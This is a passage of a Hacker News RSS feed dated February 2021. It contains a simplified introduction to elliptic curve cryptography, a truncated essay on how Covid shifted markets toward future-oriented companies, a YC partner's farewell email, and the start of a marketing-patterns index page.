<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/">https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26117386</guid>
            <pubDate>Fri, 12 Feb 2021 19:16:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[(Very) Basic Intro to Elliptic Curve Cryptography]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26116887">thread link</a>) | @wagslane
<br/>
February 12, 2021 | https://qvault.io/2020/09/17/very-basic-intro-to-elliptic-curve-cryptography/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/09/17/very-basic-intro-to-elliptic-curve-cryptography/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
<p>Elliptic curve cryptography is a modern <a aria-label=" (opens in a new tab)" href="https://searchsecurity.techtarget.com/definition/public-key" target="_blank" rel="noreferrer noopener nofollow">public-key&nbsp;encryption&nbsp;</a>technique based on mathematical elliptic curves and is well-known for creating smaller, faster, and more efficient cryptographic keys. For example, <a aria-label=" (opens in a new tab)" href="https://bitcoin.org/" rel="noreferrer noopener nofollow" target="_blank">Bitcoin</a> uses ECC as its asymmetric cryptosystem because of its lightweight nature.</p>
<p>In this introduction to ECC, I want to focus on the high-level ideas that make <a aria-label="ECC (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Elliptic-curve_cryptography" target="_blank">ECC</a> work. For the purposes of keeping this article easier to digest, I’ll omit implementation details and mathematical proofs, we can save those for another time.</p>
<h2>What is elliptic curve cryptography used&nbsp;for?</h2>
<p>A common use of ECC is to encrypt data so that only authorized parties can decrypt it. This has several obvious use cases but is most often used to encrypt internet traffic. For example, on the <a href="https://qvault.io/">Qvault web app</a> I could used ECC to encrypt a verification email so that no one but the recipient can read the message.</p>
<h2>ECC is public-key cryptography</h2>
<p>There are many types of public-key cryptography, and Elliptic Curve Cryptography is just one flavor. Other algorithms include <a aria-label="RSA (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)" target="_blank">RSA</a>, <a aria-label="Diffie-Helman (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange" target="_blank">Diffie-Helman</a>, etc. Let’s go over a quick background of public-key cryptography as a jumping-off point, so that I can discuss ECC and build on top of these ideas. By all means, study more in-depth on public-key cryptography when you have the time.</p>
<p>Public-key cryptography allows the following to happen:</p>

<p>We create two keys, a public key, and a private key. The public key is given freely, and any party can encrypt data by using it. However, the private key is kept secret and only those who hold it will have the ability to decrypt data.</p>
<h2>An example of public-key cryptography</h2>
<p>Let’s pretend that Facebook is going to receive a private post from Donald Trump. Facebook needs to be able to ensure that when the ex-president sends his post over the internet, no one in the middle (Like the NSA, or an internet service provider) can read the message. The entire exchange using public-key cryptography would go like this:</p>
<ul><li>Donald Trump Notifies Facebook that he wants to send them a private post</li><li>Facebook sends Donald Trump their public key</li><li>Donald Trump uses the public key to encrypt his post:</li></ul>
<p><em>“I love Fox and Friends” + Public Key = “s80s1s9sadjds9s”</em></p>
<ul><li>Donald Trump sends only the encrypted message to Facebook</li><li>Facebook uses its private key to decrypt the message:</li></ul>
<p><em>“s80s1s9sadjds9s” + Private Key = “I love Fox and Friends”</em></p>
<p>As you can see, this form of encryption can be quite useful. Here are some key points:</p>
<ul><li>The public key can safely be sent to anyone. It’s public.</li><li>The private key must be kept safe because if someone in the middle were to get the private key, they could decrypt messages.</li><li>Computers can quickly use the public key to encrypt a message, and quickly use the private key to decrypt a message.</li><li>Computers require a <em>very</em> long time (millions of years) to derive the original data from the encrypted message if they don’t have the private key.</li></ul>
<h2>How it Works: The Trapdoor&nbsp;Function</h2>
<p>The crux of all public-key cryptographic algorithms is that they each have their own unique trapdoor function<strong>. </strong>A trapdoor function is a function that can only be computed one way, or at least can only be computed one way <em>easily</em> (in less than millions of years using modern computers).</p>
<h3>Not a trapdoor function:</h3>
<p><code>A + B = C</code></p>
<p>If I’m given A and B I can compute C. However, if I’m given B and C I can also compute A. This is not a trapdoor function.</p>
<h3>Trapdoor function:</h3>
<p><code>"I love Fox and Friends” + Public Key --&gt; s80s1s9sadjds9s</code></p>
<p>If given <em>“I love Fox and Friends”</em> and the public key, I can produce <code>s80s1s9sadjds9s</code>, but if given <code>s80s1s9sadjds9s</code> and the Public Key I can’t produce <em>“I love Fox and Friends”</em></p>
<p>In RSA, which is arguably the most widely used public-key cryptosystem, the trapdoor function relies on how hard it is to factor large numbers into their prime factors.</p>
<p><strong>Public Key:</strong> <code>944,871,836,856,449,473</code></p>
<p><strong>Private Key:</strong> <code>961,748,941</code> and <code>982,451,653</code></p>
<p>In the example above the public key is a very large number, and the private key is the two prime factors of the public key. This is a good example of a Trapdoor Function because it is very easy to multiply the numbers in the private key together to get the public key, but if all you have is the public key it will take a very long time using a computer to re-create the private key.</p>
<p><em>Note: In real cryptography, the private key would need to be 200+ digits long to be considered secure.</em></p>
<h2>What Makes Elliptic Curve Cryptography Different?</h2>
<p>You would use ECC for the same reasons as RSA. ECC and RSA both generate a public and private key and allow two parties to communicate securely. One advantage to ECC however, is that a 256-bit key in ECC offers about the same security as a 3072-bit key using RSA. ECC allows resource-constrained systems like smartphones, embedded computers, and cryptocurrency networks to use ~10% of the storage space and bandwidth required by RSA.</p>
<h2>ECC’s Trapdoor&nbsp;Function</h2>
<p>This is probably why most of you are here. The trapdoor function is what makes ECC special and different than RSA. The trapdoor function is similar to a mathematical game of pool.</p>
<p>First, we start with an arbitrary point on the curve. Next, we use the dot function to find a new point. Finally, we keep repeating the dot function to hop around the curve until we finally end up at our last point. Let’s walk through the algorithm.</p>

<ul><li>Starting at <code>A</code>:</li><li><code>A dot B = -C</code> (Draw a line from A to B and it intersects at -C)</li><li>Reflect across the X-axis from -C to C</li><li><code>A dot C = -D</code> (Draw a line from A to C and it intersects -D)</li><li>Reflect across the X-axis from -D to D</li><li><code>A dot D = -E</code> (Draw a line from A to D and it intersects -E)</li><li>Reflect across the X-axis from -E to E</li></ul>
<p>This is a great trapdoor function because if you know where the starting point (A) is and how many hops are required to get to the ending point (E), it’s very easy to find the ending point. On the other hand, if all you know is where the starting point and ending point are, it’s nearly impossible to find how many hops it took to get there.</p>
<p>Public Key: Starting Point A, Ending Point E</p>
<p>Private Key: Number of hops from A to E</p>
<h2>Questions?</h2>
<p>Here are a few questions I had when I first learned about ECC. Hopefully, I can address them properly.</p>
<h3>1. How is the second point found? If the dot function is basically drawing a line between two points, don’t you need a second point to start&nbsp;with?</h3>
<p>No. The second point (we will call it -R below) is actually the result of P dot P (let’s assume the first point is called P)</p>
<p><code>P dot P = -R</code></p>
<p>So what is <code>P dot P</code>? It is actually just the tangent line of P. See the graphic below:</p>

<h3>2. What happens if the dot function produces a line that will go way off out to some&nbsp;extreme?</h3>
<p>If the line doesn’t hit the curve close to the origin, we can actually define a maximum X value where the line will wrap back around and start from the beginning again. See the graphic below for an example.</p>

<h3>3. If the number of hops is the private key, can’t I just count the hops until I hit the endpoint?</h3>
<p>Nope! The number of hops is <em>very</em> large, something like <code>2^256</code>. It would take far too long to compute each hop one by one, for example <code>p dot p dot p dot p ...</code>.</p>
<p>If however, you know the number of hops you can use an <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring" target="_blank" aria-label="exponentiation (opens in a new tab)" rel="noreferrer noopener nofollow">exponentiation</a> trick to find the ending point quite quickly. For example, and omitting the details of elliptic curve operations: <code>2P = P dot P</code> and then <code>4P = 2P dot 2P</code>. This allows you to get up to those crazy high calculations exponentially faster.</p>
<h2>Who Cares?</h2>
<p>ECC is used as the cryptographic key algorithm in Bitcoin because it potentially can save ~90% of the resources used by a similar RSA system. It seems that each year we see more systems moving from RSA to a more modern elliptic curve approach.</p>
<div><div>
<h2>Thanks For Reading!</h2>
<p>If you’re interested in furthering your CS career, take our <a href="https://qvault.io/">computer science courses</a></p>
<p>Follow and hit us up on Twitter <a href="https://twitter.com/q_vault" rel="noopener">@q_vault</a> if you have any questions or comments, and if we’ve made a mistake be sure to <a href="https://qvault.io/contact/">let us know</a> so we can get it corrected!</p>
<p><a href="https://mailchi.mp/5c7f5c281bbe/qvault-newsletter-subscribe" rel="noopener">Subscribe</a> to our newsletter for more programming articles</p>
</div></div>
<h2>Related Articles</h2>
<ul><li><a href="https://qvault.io/2020/01/29/hashing-passwords-python-cryptography-examples/">Hashing Passwords – Python Cryptography Examples</a></li><li><a href="https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/">How SHA-2 Works Step-By-Step (SHA-256)</a></li><li><a href="https://qvault.io/2019/07/09/is-aes-256-quantum-resistant/">Is AES-256 Quantum Resistant?</a></li></ul>
 </div></div>]]>
            </description>
            <link>https://qvault.io/2020/09/17/very-basic-intro-to-elliptic-curve-cryptography/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116887</guid>
            <pubDate>Fri, 12 Feb 2021 18:36:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Covid brought the future back]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 31 (<a href="https://news.ycombinator.com/item?id=26116488">thread link</a>) | @furtively
<br/>
February 12, 2021 | https://worksinprogress.co/issue/how-covid-brought-the-future-back/ | <a href="https://web.archive.org/web/*/https://worksinprogress.co/issue/how-covid-brought-the-future-back/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<div>
						<p>When the US joined World War Two, it set back a number of peacetime R&amp;D projects. A team at Bell Labs had been studying some interesting properties of semiconducting substances, with the hope that they might find a way to replace the then-ubiquitous vacuum tube. But the exigencies of wartime complicated their plans—for one thing, the only supplier of sufficiently pure silicon was a German company—so they took a break to focus on wartime applications like radar. By the time they returned to regular work, the war was won, the US industrial base had dramatically ramped up (now DuPont, not German suppliers, made the world’s purest silicon), and the team had acquired an encyclopedic knowledge of how substances like silicon and germanium behave.</p>
<p>Two years later, the transistor was born.</p>
<p>Crises radically reshape priorities; they cancel some projects, and accelerate others. But another effect they have is to make people more conscious of the future. To struggle through a crisis is, implicitly, to view the future as a point very much worth getting to. The Bell Labs team certainly helped build a better postwar future, and arguably Covid-19 has pushed people in the same direction.</p>
<p>We shouldn’t expect the results of this to be visible just yet. Scientific progress is visible on a lag: while the <i>New York Times</i> did mention the invention of transistors, it was midway through a column called “news of the radio,” hardly an accurate assessment of the impact of one of the twentieth century’s great inventions. Fortunately, there are more real-time ways to approximate people’s attitudes towards the future—the stock market is a real-time dollar-weighted poll about what kinds of companies will matter, and how that’s changing.</p>
<p>One of the surprising consequences of the Covid-19 pandemic was that, after a brief and fearsome decline, overall asset prices rose. That’s partly an artifact of how policymakers responded to the pandemic; pumping liquidity into the market does help offset supply shocks, and some of that money finds its way into speculative vehicles. But even <i>within</i> the market, there’s been a striking rise in investor interest in electric vehicles, autonomous cars, AI, and software companies ranging from consumer-facing companies like Facebook and Google to complex enterprise products like Snowflake.</p>
<p>The market’s judgments always have to be taken judiciously. Humans are imperfect judges of the present, not to mention the future. And as the recent GameStop fireworks demonstrate, sometimes prices can be driven more by technical aspects of market structure than by a cold and calculating assessment of the net present value of future cash flows. Even GameStop’s run-up, though, was born out of forward-looking analysis of a business, not gambling. The original thesis behind buying GameStop, before it turned into a social movement devoted to punishing hedge funds, <i>was</i> an argument that the company was fundamentally underpriced—because the market had missed its opportunity to transcend brick-and-mortar retailing and digitize its business!</p>
<p>There are definite precedents for extrapolating about new concerns from stock prices. Defense stocks rise when war is rumored to be imminent, for example, and cyclical stocks’ performance tends to change ahead of macro data on the economic cycle. More narrowly, the economist Armen Alchian <a href="https://www.sciencedirect.com/science/article/abs/pii/S0929119914000546">deduced that hydrogen bombs use lithium by tracking the stock prices of mining companies</a>.</p>
<p>Today, the world’s most valuable automaker is Tesla, with a market capitalization of $827bn, compared to $232bn for runner-up Toyota. Tesla isn’t valued based on its current production (just under 500,000 vehicles annually, compared to Toyota’s 9.2 million) or high margins (it eked out a net profit margin of just under 2%, less than half of Toyota’s results). Instead, Tesla is valued based on three forward-looking intangibles: it’s a pure-play electric vehicle company, its brand name is synonymous with clean energy rather than the more mixed reaction General Motors or Hyundai might engender, and its charismatic CEO has been able to recruit cult-like adherents to his vision of sustainable transportation and a multiplanetary species.</p>
<p>Calling Tesla is a cult isn’t pejorative, just descriptive: any organization that successfully accomplishes something that is widely believed to be impossible has to have distinctive beliefs, and any group of people who behave in unusual ways because of shared beliefs can be reasonably described as a cult. Some companies use their cultish aspects in harmful ways, but cults are a social design pattern that shows up over and over again, in successful companies and political movements. Cult-like traits are more common with companies that are growing fast—it would be hard for a steel mill or a local bank to engender this kind of behavior in its employees. It’s a way to focus everyone’s energy on the future, and avoid distracting questions about whether or not that future is viable—a way to raise the variance of outcomes, which makes extreme upside scenarios possible while increasing the odds of failure.</p>
<p>Tesla is not the only futuristic vehicle stock to be accorded a high value by the stock market. In fact, it’s arguably among the more mature. There are at least earnings to put a price/earnings multiple on, whereas many of the more recent EV companies are at an earlier stage than that. Luminar Technologies, for example, went public through a reverse merger late last year, and currently has a market value of almost $11bn. The company has minimal sales ($11m over the last nine months) and is still pouring money into R&amp;D. But LiDAR appears to be the most promising way to get cars to full autonomy, so investors are willing to value it based on the chance that a) autonomous vehicles will happen, b) they’ll use LiDAR, c) they’ll use Luminar’s systems to do it, and d) Luminar will be able to earn acceptable margins selling it.</p>
<p>The joint probability of all of those possibilities is low if they’re independent: if there’s a 10% chance of autonomous vehicles, a 10% chance they’ll use LiDAR, a 10% chance that LiDAR-using AVs will use Luminar’s technology, and a 10% chance that Luminar will get good margins, then the odds of Luminar being a good investment work out to 0.01%. But the more ambitious a company is, the more its job is to make those variables <i>conditional</i> instead: the closer a company gets to being the <i>only</i> way a given technology can happen, the more technology risk becomes synonymous with business risk, which compresses the overall range of outcomes. It also solves for the viable-business condition: if there’s just one company that can make AVs possible, then that company will have the pricing power necessary to make them profitable, too.</p>
<p>This dynamic actually works in two directions: first, it means that the odds of Luminar selling LiDAR conditional on LiDAR becoming ubiquitous are higher, because the latter is most probably going to happen if the former is true. And second, it’s a recruiting tool: if there’s one company that has a reasonable shot at accomplishing something, and it’s a desirable goal, then the company has a monopoly on the kinds of employees who can achieve that goal. This is a point Peter Thiel articulates in <i>Zero to One</i>, and it’s one of the reasons technology companies have such a skewed distribution of outcomes. They articulate a variant view, which means they attract people who share that variant view—and since the argument is settled by technology and economics, they don’t have to persuade the rest of the world, just to offer a better product.</p>
<p>The rise of special purpose acquisition vehicles, or SPACs, is a general testament to a more forward-looking market. In a conventional IPO, an operating company sells shares to the public; with a SPAC, an empty shell company goes public, and then identifies a private company to merge with. Due to a quirk in securities laws, a traditional IPO prospectus only shows a company’s backwards-looking estimates, and makes heavily-qualified statements about the future. A company that goes public through a SPAC is technically engaging in a merger, rather than an IPO, and the rules are different. When a public company buys another company, securities laws allow it to talk about that company’s anticipated growth, or the likely cost savings of the merger. Similarly, SPAC offerings can talk up a company’s long-term prospects, and even make exact estimates of future revenue.</p>
<p>SPACs have existed for years, but they exploded in popularity in 2020. Of the 466 SPAC companies that went public from 2011 through 2020, 248 of them went public in 2020 alone. A number of technical forces drove this—a large number of private companies looking for acquisitions, investors eager to get into <i>any</i> growth company early, some technicalities around SPAC issuance that make them attractive to specialist hedge funds. But the key driver of excitement about SPACs is that they can take companies public based on a future-focused outlook.</p>
<p>When Virgin Galactic went public by merging with Chamath Palihapitiya’s Social Capital Hedosophia Holdings, the company, which has taken deposits but generated minimal revenue, was able to project $590 million in annual revenue in the year 2023, and over a quarter of a billion dollars in pretax, pre-depreciation earnings. While this was optimistic, it’s also demonstrative: a company like Virgin Galactic would have been almost impossible to take public in a conventional way, because backwards-looking financial statements showed only losses. it may not work out as a business, or live up to its projections, but those projections got more plausible once it had access to public markets for funding.</p>
<p>High valuations for money-losing, often pre-revenue companies remind people of the dot-com bubble, and it’s worth putting that bubble in perspective. Someone who bought the market at its peak in March 2000 has earned a 6% compounded return since then. …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://worksinprogress.co/issue/how-covid-brought-the-future-back/">https://worksinprogress.co/issue/how-covid-brought-the-future-back/</a></em></p>]]>
            </description>
            <link>https://worksinprogress.co/issue/how-covid-brought-the-future-back/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116488</guid>
            <pubDate>Fri, 12 Feb 2021 17:58:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Goodbye YC]]>
            </title>
            <description>
<![CDATA[
Score 220 | Comments 37 (<a href="https://news.ycombinator.com/item?id=26116420">thread link</a>) | @awaxman11
<br/>
February 12, 2021 | https://blog.aaronkharris.com/goodbye-yc | <a href="https://web.archive.org/web/*/https://blog.aaronkharris.com/goodbye-yc">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
      <div><p><i>I sent this email to the whole team at YC yesterday:</i></p><p>When I joined&nbsp;YC&nbsp;7.5 years ago, there weren’t many people around. PG and Jessica were still running things. We had offices in Mountain View, Palo Alto, and on Kearny street, but they were nearly always empty. The only meeting on any calendar was the lunch on Thursdays where we’d talk about companies over takeout or at a table in a crowded restaurant.</p><p>The ways in which we’ve changed since then have been amazing to see.&nbsp;YC&nbsp;has grown in every way imaginable. The scope of what&nbsp;YC&nbsp;funds is larger. The team is bigger and more capable. The number of companies is pushing towards some ever receding upper bound. There’s more software, a larger community, and more programming designed to help&nbsp;YC&nbsp;founders build better futures.</p><p>I feel a deep sense of pride and honor at the part that I’ve played in that change and growth. I recall the first conversation I had with Aaron King about the Series A for Snapdocs. The questions he and I worked through were the kernel of the Series A program. I am amazed to see the directions in which Janelle is now building YCA. I’m grateful for the part I played in our conversations about growing beyond seed investing - conversations which eventually took shape as YCC. And, of course, there are fifteen batches worth of applications, interviews, dinners, office hours, and demo days rattling around in my head.<br></p><p>I’ve been thinking, recently, about the founders with whom I’ve had a chance to work. I’ve lost count of the number of incredible people I’ve gotten to know over these last years. Thinking back, it’s easy to see how the sheer weight of numbers can drive a person to be jaded about the problems that founders face. But the other night, as I spoke with a founder about a tough situation, I was reminded about how important it is to that individual that she gets the best possible advice. This is a lesson I learned time and again, and is something I hope I’ll never forget.</p><p>And then there’s the funny stuff. There were stolen air conditioners, barefoot pitches, robots that did not make sandwiches, update emails pulled from the I Ching, bandages, inhaled jet fuel, and literal blood on the interview floors. These are the things that I’ll remember long after everything else.</p><p>The truth is, I only meant to stick around&nbsp;YC&nbsp;for two years. Somehow, that two became two more, and then some more. As meaningfully as I’ve enjoyed my work here, it’s time for me to move onto something different and new and outside the bounds of what&nbsp;YC&nbsp;does. That’s a strange, exhilarating moment, and an important one for me and for my family. The pandemic provided the practical and existential nudge I needed to see the depth of this need.</p><p>To my fellow partners - thank you for your tireless work for our founders and for&nbsp;YC. Thank you for everything you’ve taught me, for all the strange conversations we’ve had, and for all the demo day presentations we’ve crafted.</p><p>To PG and Jessica and Trevor and RTM - thank you for giving me this opportunity and for making&nbsp;YC&nbsp;the kind of place I could love enough to stay long after I meant to leave.</p><p>To Janelle - thank you for building YCA with me and for being the best person I could imagine to take it into the future.</p><p>To everyone else -&nbsp;YC’s mission in the world is abstract. It could mean so many things, but it wouldn’t be anything without your work. Whether you are managing founder expectations about housing in the Bay Area, helping someone understand the mysteries of cap tables, talking someone down off the ledge of yelling at a reporter, or making sure that there will one day be an office to come back to, you are what makes&nbsp;YC&nbsp;a viable, vital force in the world.</p><p>I’ve never liked&nbsp;goodbye.</p><p>aaron</p></div>
    
  </div></div>]]>
            </description>
            <link>https://blog.aaronkharris.com/goodbye-yc</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116420</guid>
            <pubDate>Fri, 12 Feb 2021 17:54:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Marketing Patterns – DIY Template for Growth]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26116276">thread link</a>) | @zxlk21e
<br/>
February 12, 2021 | https://terrygodier.com/patterns/ | <a href="https://web.archive.org/web/*/https://terrygodier.com/patterns/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<section>

<!-- begin patterns -->
												<div>
					<p><a href="https://terrygodier.com/patterns/ridiculous-products-for-digital-pr/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-150x79.png" alt="digital pr 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Launch Ridiculous Products for Digital PR and Links 1" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/interest-tests-with-facebook-ads/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-150x79.png" alt="interest targeting 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Test Audience Interests with Facebook Ads 2" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/leverage-your-data/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-150x79.png" alt="data stories 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Leverage Your Data for Marketing and Linkbuilding 3" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/meta-content/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-150x79.png" alt="meta content 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Build Hype by Creating Meta Content 4" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/meta-content/">Build Hype by Creating Meta Content</a></h2>
						<p>Meta content can build hype for upcoming releases, underscore quality claims, and provide a narrative to products and brands. </p>						<p><time datetime="2020-12-04T11:45:53+00:00">12/4/2020 11:45am</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/repurpose-and-recycle/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-150x79.png" alt="recycle repurpose 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Repurpose and Recycle Content for Social Media 5" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/repurpose-and-recycle/">Repurpose and Recycle Content for Social Media</a></h2>
						<p>Get better at promoting existing assets instead of becoming addicted to creating new ones. Repurposing creates many small assets from a larger piece, and recycling creates something new from many existing assets.</p>						<p><time datetime="2020-11-20T11:28:58+00:00">11/20/2020 11:28am</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/swag-giveaways/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-150x79.png" alt="swag 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Do Swag Giveaways to Grow Your Business 6" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/social-listening/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-150x79.png" alt="social listening 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Monitor Your Social Media Mentions with Social Listening 7" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
